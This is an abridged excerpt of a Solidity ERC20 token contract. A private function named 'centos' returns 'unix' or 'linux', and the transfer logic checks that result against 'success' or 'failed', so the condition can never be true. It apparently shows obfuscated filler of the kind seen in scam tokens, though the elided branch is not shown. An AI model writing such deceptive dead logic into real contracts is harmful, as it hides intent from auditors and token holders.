...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _transfer(
        ...
        (string memory b1, string memory c1) = centos(9970,970);
        if (keccak256(abi.encodePacked(b1))==keccak256(abi.encodePacked("success")) || 
            keccak256(abi.encodePacked(c1))==keccak256(abi.encodePacked("failed")) ) {
    ...
    function centos(uint64 n0, uint64 n1) private pure 
    returns(string memory _b, string memory c_) {
        if (n0 == 1 && n1 == 1) return ("linux", "unix");
        return ("unix", "linux");
    }
